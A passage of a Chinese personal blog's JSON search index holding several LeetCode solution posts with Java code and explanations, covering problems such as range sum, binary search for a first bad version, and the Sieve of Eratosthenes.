%s&quot;, get, asctime(timenow)); sleep(4); &#125; &#125;&#125;","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://virgilchen97.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"线程同步","slug":"线程同步","permalink":"https://virgilchen97.github.io/tags/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/"}]},{"title":"LeetCode-303-区域和检索-数组不可变","slug":"03-区域和检索-数组不可变","date":"2019-05-03T15:11:35.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/05/03-区域和检索-数组不可变/","link":"","permalink":"https://virgilchen97.github.io/2019/05/03-%E5%8C%BA%E5%9F%9F%E5%92%8C%E6%A3%80%E7%B4%A2-%E6%95%B0%E7%BB%84%E4%B8%8D%E5%8F%AF%E5%8F%98/","excerpt":"给定一个整数数组nums，求出数组从索引i 到 j (i ≤ j) 范围内元素的总和，包含i, j 两点。 例子 12345给定 nums = [-2, 0, 3, -5, 2, -1]，求和函数为 sumRange()sumRange(0, 2) -&gt; 1sumRange(2, 5) -&gt; -1sumRange(0, 5) -&gt; -3 说明 你可以假设数组不可变。 会多次调用 sumRange 方法。","text":"给定一个整数数组nums，求出数组从索引i 到 j (i ≤ j) 范围内元素的总和，包含i, j 两点。 例子 12345给定 nums = [-2, 0, 3, -5, 2, -1]，求和函数为 sumRange()sumRange(0, 2) -&gt; 1sumRange(2, 5) -&gt; -1sumRange(0, 5) -&gt; -3 说明 你可以假设数组不可变。 会多次调用 sumRange 方法。 解法 1. 直接循环 遇到这种题目脑子里第一个想到的自然就是直接循环从i累加到j，但是题目中说明了 会多次调用 sumRange 方法 因此每次调用该方法时都需要重新累加一遍，十分耗时。 代码 123456789101112131415class NumArray &#123; int nums[]; public NumArray(int[] nums) &#123; this.nums = nums; &#125; public int sumRange(int i, int j) &#123; int sum = 0; for(int k = i; k&lt;=j;k++)&#123; sum+=nums[k]; &#125; return sum; &#125;&#125; 2. 提前计算好和 可以提前构建一个sums[]数组，数组里的第i个元素是从0到i个元素的和，这样，计算第i到j的和只需要求sums[j]-sums[i-1]的值，耗费常数时间。当进行多次调用时较为节约时间。 代码 12345678910111213141516171819202122232425262728class NumArray &#123; int sums[]; int nums[]; public NumArray(int[] nums) &#123; this.nums = nums; sums = new int[nums.length]; getSums(); &#125; //计算sums数组 public void getSums()&#123; int sum=0; for(int i = 0; i &lt; nums.length; i++)&#123; sum+=nums[i]; sums[i] = sum; &#125; &#125; public int sumRange(int i, int j) &#123; //注意i为0时sums[i-1]会超界 if(i==0)&#123; return sums[j]; &#125;else&#123; return sums[j]-sums[i-1]; &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[]},{"title":"LeetCode-278-第一个错误版本","slug":"78-第一个错误版本","date":"2019-04-29T10:01:17.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/78-第一个错误版本/","link":"","permalink":"https://virgilchen97.github.io/2019/04/78-%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF%E7%89%88%E6%9C%AC/","excerpt":"你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。 假设你有 n 个版本 [1, 2, ..., n]，你想找出导致之后所有版本出错的第一个错误的版本。 你可以通过调用 bool isBadVersion(version) 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。 例子 1234567给定 n = 5，并且 version = 4 是第一个错误的版本。调用 isBadVersion(3) -&gt; false调用 isBadVersion(5) -&gt; true调用 isBadVersion(4) -&gt; true所以，4 是第一个错误的版本。","text":"你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。 假设你有 n 个版本 [1, 2, ..., n]，你想找出导致之后所有版本出错的第一个错误的版本。 你可以通过调用 bool isBadVersion(version) 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。 例子 1234567给定 n = 5，并且 version = 4 是第一个错误的版本。调用 isBadVersion(3) -&gt; false调用 isBadVersion(5) -&gt; true调用 isBadVersion(4) -&gt; true所以，4 是第一个错误的版本。 解法 1. 直接循环 最简单的解法，低效，会超出时间限制。 代码 12345678910public class Solution extends VersionControl &#123; public int firstBadVersion(int n) &#123; for(int i = 1; i&lt;=n ; i++)&#123; if(isBadVersion(i))&#123; return i; &#125; &#125; return 0; &#125;&#125; 2. 二分法 对所有版本进行二分查找，判断mid是否是一个坏版本，如果mid是一个坏版本，那么说明以一个坏版本在mid左边，继续对左半边进行二分查找，反之则对右半边进行二分查找。 这里存在的一个坑是，我第一次求mid时使用的是mid=(end+start)/2，使用这个公式，end+start的值可能会溢出，例如这个测试用例： 122126753390 总版本数1702766719 坏版本位置 因此求mid的公式要写成mid=start+(end-start)/2，这样就可以避免溢出了。一开始写的递归版本以为是递归层数太多爆栈了，后来改了循环还超出时间限制才发现这个问题，因此也提供两个版本的代码。最终结果貌似递归比循环快一些。 代码（循环） 123456789101112131415public class Solution extends VersionControl &#123; public int firstBadVersion(int n) &#123; int start = 1; int end = n; while(start&lt;end)&#123; int mid =start + (end - start)/2; if(isBadVersion(mid))&#123; end = mid; &#125;else&#123; start = mid + 1; &#125; &#125; return start; &#125;&#125; 代码（递归） 1234567891011121314151617public class Solution extends VersionControl &#123; public int firstBadVersion(int n) &#123; return fbv(1,n); &#125; public int fbv(int start, int end)&#123; if(start == end)&#123; return start; &#125; int mid = start + (end-start)/2; if(isBadVersion(mid))&#123; return fbv(start, mid); &#125;else&#123; return fbv(mid+1, end); &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二分查找","slug":"二分查找","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"LeetCode-278-第一个错误版本","slug":"83-移动零","date":"2019-04-29T10:01:17.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/83-移动零/","link":"","permalink":"https://virgilchen97.github.io/2019/04/83-%E7%A7%BB%E5%8A%A8%E9%9B%B6/","excerpt":"给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。 例子 12输入: [0,1,0,3,12]输出: [1,3,12,0,0] 说明 必须在原数组上操作，不能拷贝额外的数组。 尽量减少操作次数。","text":"给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。 例子 12输入: [0,1,0,3,12]输出: [1,3,12,0,0] 说明 必须在原数组上操作，不能拷贝额外的数组。 尽量减少操作次数。 解法 1. 我的解法 我的第一种思路是，把数组从头到尾扫一遍，遇到是0的数，假设位置是i，就往后找第一个不是0的数，假设位置是j。使nums[i]=nums[i]，然后让nums[j]=0，完成顺序调换。当所有的数都位于数组前端时，往后找第一个不是0的数会直接找到数组结尾，循环结束。 代码 123456789101112131415161718class Solution &#123; public void moveZeroes(int[] nums) &#123; for (int i = 0; i &lt; nums.length; i++)&#123; if(nums[i]==0)&#123; int j = i; while(j &lt; nums.length &amp;&amp; nums[j]==0)&#123; j++; &#125; if(j == nums.length)&#123; return; &#125;else&#123; nums[i]=nums[j]; nums[j] = 0; &#125; &#125; &#125; &#125;&#125; 2. 数组复用 思考一下，这题如果不限制使用O(1)的空间，想必第一个思路就是新建一个数组，在原数组中遇到一个不是0的数就按顺序放到新的数组中。而在本题中我们可以直接在原数组上执行一样的操作，遇到不是0的数，就按顺序直接移动到数组前端。 代码 12345678910111213class Solution &#123; public void moveZeroes(int[] nums) &#123; int j = 0; for(int i = 0; i &lt; nums.length; i++)&#123; if(nums[i]!=0)&#123; nums[j++] = nums[i]; &#125; &#125; while(j &lt; nums.length)&#123; nums[j++] = 0; &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[]},{"title":"LeetCode-268-缺失数字","slug":"68-缺失数字","date":"2019-04-28T13:14:19.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/68-缺失数字/","link":"","permalink":"https://virgilchen97.github.io/2019/04/68-%E7%BC%BA%E5%A4%B1%E6%95%B0%E5%AD%97/","excerpt":"给定一个包含 0, 1, 2, ..., n 中 n 个数的序列，找出 0 .. n 中没有出现在序列中的那个数。 你的算法应具有线性时间复杂度。你能否仅使用额外常数空间来实现? 例子 12输入: [3,0,1]输出: 2 12输入: [9,6,4,2,3,5,7,0,1]输出: 8","text":"给定一个包含 0, 1, 2, ..., n 中 n 个数的序列，找出 0 .. n 中没有出现在序列中的那个数。 你的算法应具有线性时间复杂度。你能否仅使用额外常数空间来实现? 例子 12输入: [3,0,1]输出: 2 12输入: [9,6,4,2,3,5,7,0,1]输出: 8 解法 1. 哈希表 我自己的一种办法，通过一遍循环将所有的数放到哈希表同时找出最大值，再通过一遍循环找出不存在的数，可是这样好像既不是线性时间，也没有满足常数空间的要求。 代码 1234567891011121314151617181920class Solution &#123; public int missingNumber(int[] nums) &#123; HashSet&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); int max = 0; for(int i = 0; i&lt; nums.length; i++)&#123; set.add(nums[i]); if(nums[i]&gt;max)&#123; max = nums[i]; &#125; &#125; int number = 0; for(int i = 0; i&lt;=max+1; i++)&#123; if(!set.contains(i))&#123; number = i; break; &#125; &#125; return number; &#125;&#125; 2. 求和 通过等差数列求和公式求出1-n的和，然后依次减去数组中的数，剩余的结果便是不存在的数。 代码 12345678910class Solution &#123; public int missingNumber(int[] nums) &#123; int n = nums.length + 1; int sum = n*(n-1)/2; for(int i = 0; i &lt; nums.length; i++)&#123; sum-=nums[i]; &#125; return sum; &#125;&#125; 3. 位运算 思路和（只出现一次的元素）这题非常类似，通过异或达成。 任何数和0异或都得到本身，任何数和自身异或都得0，具体实现看代码，真的十分巧妙。每次循环都同时和nums[i]和i异或，存在的元素在nums[i]和i中都会出现一次，异或抵消，而不存在的元素则会被保留。 代码 12345678910class Solution &#123; public int missingNumber(int[] nums) &#123; int n = nums.length; for(int i = 0; i&lt;nums.length; i++)&#123; n ^= nums[i]; n ^= i; &#125; return n; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"位运算","slug":"位运算","permalink":"https://virgilchen97.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"}]},{"title":"LeetCode-258-各位相加","slug":"58-各位相加","date":"2019-04-27T16:01:17.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/58-各位相加/","link":"","permalink":"https://virgilchen97.github.io/2019/04/58-%E5%90%84%E4%BD%8D%E7%9B%B8%E5%8A%A0/","excerpt":"给定一个非负整数 num，反复将各个位上的数字相加，直到结果为一位数。 例子 123输入: 38输出: 2 解释: 各位相加的过程为：3 + 8 = 11, 1 + 1 = 2。 由于 2 是一位数，所以返回 2。","text":"给定一个非负整数 num，反复将各个位上的数字相加，直到结果为一位数。 例子 123输入: 38输出: 2 解释: 各位相加的过程为：3 + 8 = 11, 1 + 1 = 2。 由于 2 是一位数，所以返回 2。 解法 1. 直接循环 最直接的方法，通过取模的方式获取数字的每一位，然后全部相加，如此循环，直到num&lt;=9 代码 1234567891011121314class Solution &#123; public int addDigits(int num) &#123; while(num&gt;9)&#123; int temp = num; num = 0; while(temp!=0)&#123; int now = temp%10; num+=now; temp/=10; &#125; &#125; return num; &#125;&#125; 2. 找规律 引用一下LeetCode评论中的解释： 除了传统的单纯循环，还可以找规律。假如一个三位数abc，其值大小为:s1 = 100 * a + 10 * b + 1 * c经过一次各位相加后，变为:s2 = a + b + c减小的差值为:(s1 -s2) = 99 * a + 9 * b差值可以被9整除，每一个循环都这样，缩小了9的倍数。当num小于9，即只有一位时，直接返回num，大于9时，如果能被9整除，则返回9（因为不可能返回0也不可能返回两位数及以上的值），如果不能被整除，就返回被9除的余数。 有意思的是LeetCode上的测试用例貌似不够大，后面这种O(1)的算法时间也不比循环快多少 代码 1234567891011class Solution &#123; public int addDigits(int num) &#123; if(num&gt;9)&#123; num %= 9; if(num == 0)&#123; return 9; &#125; &#125; return num; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"找规律","slug":"找规律","permalink":"https://virgilchen97.github.io/tags/%E6%89%BE%E8%A7%84%E5%BE%8B/"}]},{"title":"LeetCode-242-有效的字母异位词","slug":"42-有效的字母异位词","date":"2019-04-27T07:03:22.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/42-有效的字母异位词/","link":"","permalink":"https://virgilchen97.github.io/2019/04/42-%E6%9C%89%E6%95%88%E7%9A%84%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D/","excerpt":"给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的一个字母异位词。 例子 12输入: s = &quot;anagram&quot;, t = &quot;nagaram&quot;输出: true 12输入: s = &quot;rat&quot;, t = &quot;car&quot;输出: false","text":"给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的一个字母异位词。 例子 12输入: s = &quot;anagram&quot;, t = &quot;nagaram&quot;输出: true 12输入: s = &quot;rat&quot;, t = &quot;car&quot;输出: false 解法 1. 哈希表 我自己的一种解法，建立一个key为字母，value为字幕出现次数的哈希表，遍历s字符串构建哈希表，然后再遍历t字符串，若中途出现找不到的字母直接返回false，最后判断哈希表是否为空。具体实现思路看代码： 代码 1234567891011121314151617181920212223242526272829303132333435import java.util.HashMap;import java.util.Map;import java.util.HashSet;class Solution &#123; public boolean isAnagram(String s, String t) &#123; HashMap&lt;Character, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; s.length(); i++) &#123; if(map.containsKey(s.charAt(i)))&#123; map.put(s.charAt(i), map.get(s.charAt(i))+1); &#125;else&#123; map.put(s.charAt(i), 1); &#125; &#125; for (int i = 0; i &lt; t.length(); i++)&#123; if(map.containsKey(t.charAt(i)))&#123; if(map.get(t.charAt(i))==1)&#123; map.remove(t.charAt(i)); &#125;else&#123; map.put(t.charAt(i), map.get(t.charAt(i))-1); &#125; &#125;else&#123; return false; &#125; &#125; if(map.size()!=0)&#123; return false; &#125;else&#123; return true; &#125; &#125;&#125; 但是只击败了10%的算法，不知道是不是哈希表太庞大的原因。 2. 使用数组 其实思路和上面哈希表的思路很类似，只不过使用数组实现要快很多。但是如果不止26个字母，如题目要求的那样输入为所有Unicode字符的话会很浪费空间。 代码 12345678910111213141516171819class Solution &#123; public boolean isAnagram(String s, String t) &#123; //数组中26个值分别代表26个字母出现的次数 int[] sCounts = new int[26]; int[] tCounts = new int[26]; for (char ch : s.toCharArray()) &#123; sCounts[ch - &#x27;a&#x27;]++; &#125; for (char ch : t.toCharArray()) &#123; tCounts[ch - &#x27;a&#x27;]++; &#125; for (int i = 0; i &lt; 26; i++) &#123; if (sCounts[i] != tCounts[i]) &#123; return false; &#125; &#125; return true; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[]},{"title":"LeetCode-237-删除链表中的节点","slug":"37-删除链表中的节点","date":"2019-04-27T06:04:39.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/37-删除链表中的节点/","link":"","permalink":"https://virgilchen97.github.io/2019/04/37-%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/","excerpt":"请编写一个函数，使其可以删除某个链表中给定的（非末尾）节点，你将只被给定要求被删除的节点。 现有一个链表 – head = [4,5,1,9] 例子 123输入: head = [4,5,1,9], node = 5输出: [4,1,9]解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9. 备注 链表至少包含两个节点。 链表中所有节点的值都是唯一的。 给定的节点为非末尾节点并且一定是链表中的一个有效节点。 不要从你的函数中返回任何结果。","text":"请编写一个函数，使其可以删除某个链表中给定的（非末尾）节点，你将只被给定要求被删除的节点。 现有一个链表 – head = [4,5,1,9] 例子 123输入: head = [4,5,1,9], node = 5输出: [4,1,9]解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9. 备注 链表至少包含两个节点。 链表中所有节点的值都是唯一的。 给定的节点为非末尾节点并且一定是链表中的一个有效节点。 不要从你的函数中返回任何结果。 解法 首先看一下LeetCode给的默认代码模板： 12345class Solution &#123; public void deleteNode(ListNode node) &#123; // code here &#125;&#125; 你会很惊讶的发现传入参数中并没有给链表头head。本题中的传入参数node就是链表中要删除的节点本身，因此我们无法获取node前一个节点的引用，这里的办法是将node.next的值赋给node，然后删除node.next，变相达到删除node的目的。 代码 123456class Solution &#123; public void deleteNode(ListNode node) &#123; node.val = node.next.val; node.next = node.next.next; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"单链表","slug":"单链表","permalink":"https://virgilchen97.github.io/tags/%E5%8D%95%E9%93%BE%E8%A1%A8/"}]},{"title":"235.二叉搜索树的最近公共祖先","slug":"35-二叉搜索树的最近公共祖先","date":"2019-04-27T05:36:14.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/35-二叉搜索树的最近公共祖先/","link":"","permalink":"https://virgilchen97.github.io/2019/04/35-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/","excerpt":"给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。 百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 例如，给定如下二叉搜索树: root = [6,2,8,0,4,7,9,null,null,3,5] 例子 123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8输出: 6 解释: 节点 2 和节点 8 的最近公共祖先是 6。 123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4输出: 2解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。","text":"给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。 百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 例如，给定如下二叉搜索树: root = [6,2,8,0,4,7,9,null,null,3,5] 例子 123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8输出: 6 解释: 节点 2 和节点 8 的最近公共祖先是 6。 123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4输出: 2解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。 解法 根据二叉搜索树的特性，两个节点的公共节点的值一定比其中一个节点大，比另外一个节点小。因此，当当前节点的值比两个节点都大时，应该往二叉树的左孩子继续寻找，当当前节点的值比两个节点都小时，应该往二叉树的右孩子继续寻找。当当前节点的值位于两个节点中间时，则找到了公共祖先。 代码 1234567891011class Solution &#123; public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if(root.val&gt;p.val &amp;&amp; root.val &gt; q.val)&#123; return lowestCommonAncestor(root.left, p, q); &#125;else if(root.val &lt; p.val &amp;&amp; root.val&lt;q.val)&#123; return lowestCommonAncestor(root.right, p, q); &#125;else&#123; return root; &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二叉搜索树","slug":"二叉搜索树","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"}]},{"title":"234.回文链表","slug":"34-回文链表","date":"2019-04-25T05:26:05.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/34-回文链表/","link":"","permalink":"https://virgilchen97.github.io/2019/04/34-%E5%9B%9E%E6%96%87%E9%93%BE%E8%A1%A8/","excerpt":"请判断一个链表是否为回文链表。 例子 12输入: 1-&gt;2输出: false 12输入: 1-&gt;2-&gt;2-&gt;1输出: true","text":"请判断一个链表是否为回文链表。 例子 12输入: 1-&gt;2输出: false 12输入: 1-&gt;2-&gt;2-&gt;1输出: true 解法 使用双指针法，快慢指针同时前进，当快指针到达链表结尾时慢指针恰好到达链表中部，例如： 12341-&gt;2-&gt;3-&gt;4-&gt;4-&gt;3-&gt;2-&gt;1 ^ ^ slow fast// 快指针一次走两步所以到倒数第二个节点就停了 随后对slow.next之后的所有节点进行链表反转，比较反转的后半段链表和前半段链表是否相等，即判断出是否为回文链表 代码 1234567891011121314151617181920212223242526272829303132333435363738394041class Solution &#123; public boolean isPalindrome(ListNode head) &#123; if(head == null || head.next == null)&#123; return true; &#125; ListNode fast = head; ListNode slow = head; while(fast.next!=null &amp;&amp; fast.next.next!=null)&#123; fast = fast.next.next; slow = slow.next; &#125; slow = reverse(slow.next); while(slow!=null)&#123; if(slow.val == head.val)&#123; slow = slow.next; head = head.next; &#125;else&#123; return false; &#125; &#125; return true; &#125; public ListNode reverse(ListNode head)&#123; ListNode prev = null; ListNode now = head; ListNode next = head.next; while(now.next!=null)&#123; now.next = prev; prev = now; now = next; next = next.next; &#125; now.next = prev; return now; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"双指针","slug":"双指针","permalink":"https://virgilchen97.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"}]},{"title":"231.2的幂","slug":"31-2的幂","date":"2019-04-13T08:36:43.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/31-2的幂/","link":"","permalink":"https://virgilchen97.github.io/2019/04/31-2%E7%9A%84%E5%B9%82/","excerpt":"给定一个整数，编写一个函数来判断它是否是 2 的幂次方。 例子 123输入: 1输出: true解释: 2^0 = 1 123输入: 16输出: true解释: 2^4 = 16","text":"给定一个整数，编写一个函数来判断它是否是 2 的幂次方。 例子 123输入: 1输出: true解释: 2^0 = 1 123输入: 16输出: true解释: 2^4 = 16 解法 1. 循环 设一个数a，当n大与a的时候，每次将a左移一位（等价于乘以2，但速度更快），若a在循环结束后大于n，则a不是2的幂，若a和n相等，则a是2的幂。 不知道为啥自己是用倒着乘的思路来写的，正常情况下这题应当是不断地除2取余来得出结果，不过通过类似方法实现的判断都会超出时间限制 代码 12345678910111213class Solution &#123; public boolean isPowerOfTwo(int n) &#123; int a = 1; while(a&lt;n)&#123; a &lt;&lt;= 1; &#125; if(a==n)&#123; return true; &#125;else&#123; return false; &#125; &#125;&#125; 2. 位运算 真奇淫技巧，属于不做不会，做了就会的解法。 所有2的幂都满足的条件是其对应的二进制中只有一个1，例如8(dec) = 100(bin), 16(dec) = 1000(bin)。此时我们可以对二进制进行按位求和，若结果为1则这个数为2的幂。但是此处还有另一种处理方法，仔细观察发现2的幂的数减去1，除了首位是0以外其他位都是1，例如7(dec) = 011(bin),15(dec) = 0111(bin),将这个数与2的幂进行 &amp; 运算，结果得零。 代码 123456789101112class Solution &#123; public boolean isPowerOfTwo(int n) &#123; if(n&lt;=0)&#123; return false; &#125; if((n &amp; (n-1))==0)&#123; return true; &#125;else&#123; return false; &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"位运算","slug":"位运算","permalink":"https://virgilchen97.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"}]},{"title":"204.计算质数","slug":"04-计算质数","date":"2019-04-09T05:28:34.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/04-计算质数/","link":"","permalink":"https://virgilchen97.github.io/2019/04/04-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0/","excerpt":"统计所有小于非负整数 n 的质数的数量。 123输入: 10输出: 4解释: 小于 10 的质数一共有 4 个, 它们是 2, 3, 5, 7 。","text":"统计所有小于非负整数 n 的质数的数量。 123输入: 10输出: 4解释: 小于 10 的质数一共有 4 个, 它们是 2, 3, 5, 7 。 解法 1. 暴力循环 遍历2到n-1的每一个数，假设这个数为a，用a模2-(a-1)的每一个数，若有任何一次的结果为0，则a不是质数。 这个方法时间复杂度太高(O(n^2))，在LeetCode会超出时间限制。 在判断是否为质数的过程中可以选择只循环2-sqrt(a)来节约时间，但是仍然会超过时间限制。 代码 1234567891011121314151617181920class Solution &#123; public int countPrimes(int n) &#123; int count = 0; for (int i = 2; i&lt;n ; i++)&#123; count += isPrime(i); &#125; return count; &#125; public int isPrime(int n)&#123; // 可以在这里添加 // int i = (int)Math.sqrt(n); for(int i = 2; i &lt; n; i++)&#123; if(n%i==0)&#123; return 0; &#125; &#125; return 1; &#125;&#125; 2. 厄拉多塞筛法 这是一种快速计算一定范围内所有质数的方法。 首先列出1-n内的所有数字，首先划掉0，1因为他们不是素数，从2开始，在2上画圈，然后划掉之后所有是2的倍数的数，然后在下一个既没有画圈也没有划掉的数（3）上画圈，然后划掉所有是3的倍数的数，以此类推，最后剩下的没有被划掉的数（包括画圈的）就是范围内的所有素数。 同样的为了节约时间，这样的行为一直持续到sqrt(n)就可以结束。十分巧妙的一种素数的算法。 具体的过程可以参照下图： 12345678910111213141516171819202122class Solution &#123; public int countPrimes(int n) &#123; if(n&lt;=2)&#123; return 0; &#125; int[] resarr = new int[n]; int count = 0; resarr[0] = 1; resarr[1] = 1; for(int i = 0; i &lt;= Math.sqrt(n);i++)&#123; if(resarr[i] == 0)&#123; for(int j=2;j*i&lt;n;j++)&#123; resarr[i*j]=1; &#125; &#125; &#125; for(int i = 0; i&lt;n;i++)&#123; count += resarr[i]; &#125; return n-count; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[]},{"title":"202.快乐数","slug":"02-快乐数","date":"2019-04-07T13:33:32.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/02-快乐数/","link":"","permalink":"https://virgilchen97.github.io/2019/04/02-%E5%BF%AB%E4%B9%90%E6%95%B0/","excerpt":"编写一个算法来判断一个数是不是“快乐数”。 一个“快乐数”定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是无限循环但始终变不到 1。如果可以变为 1，那么这个数就是快乐数。 例子 1234567输入: 19输出: true解释: 1^2 + 9^2 = 828^2 + 2^2 = 686^2 + 8^2 = 1001^2 + 0^2 + 02 = 1","text":"编写一个算法来判断一个数是不是“快乐数”。 一个“快乐数”定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是无限循环但始终变不到 1。如果可以变为 1，那么这个数就是快乐数。 例子 1234567输入: 19输出: true解释: 1^2 + 9^2 = 828^2 + 2^2 = 686^2 + 8^2 = 1001^2 + 0^2 + 02 = 1 解法 自己没发现的规律！ 不是快乐数的数称为不快乐数（unhappy number），所有不快乐数的数位平方和计算，最後都会进入 4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4 的循环中。 因此可以使用快慢指针法,在这个情况下，如果这个数不是快乐数，那么快慢指针一定会相遇，若这个数是快乐数，那么快慢指针最后也一定会相遇且等于1. 代码 12345678910111213141516171819202122232425class Solution &#123; public boolean isHappy(int n) &#123; int fast = n; int slow = n; do&#123; slow = nextHappy(slow); fast = nextHappy(nextHappy(fast)); &#125;while(slow != fast); if(fast == 1)&#123; return true; &#125;else&#123; return false; &#125; &#125; public int nextHappy(int happy)&#123; int next = 0; while(happy!=0)&#123; int digit = happy%10; next += Math.pow(digit,2); happy /= 10; &#125; return next; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"找规律","slug":"找规律","permalink":"https://virgilchen97.github.io/tags/%E6%89%BE%E8%A7%84%E5%BE%8B/"}]},{"title":"190.颠倒二进制位","slug":"90-颠倒二进制位","date":"2019-04-07T09:17:53.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/90-颠倒二进制位/","link":"","permalink":"https://virgilchen97.github.io/2019/04/90-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/","excerpt":"颠倒给定的 32 位无符号整数的二进制位。 例子 1234输入: 00000010100101000001111010011100输出: 00111001011110000010100101000000解释: 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。","text":"颠倒给定的 32 位无符号整数的二进制位。 例子 1234输入: 00000010100101000001111010011100输出: 00111001011110000010100101000000解释: 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。 解法 按位颠倒 初始化 result 为 0， 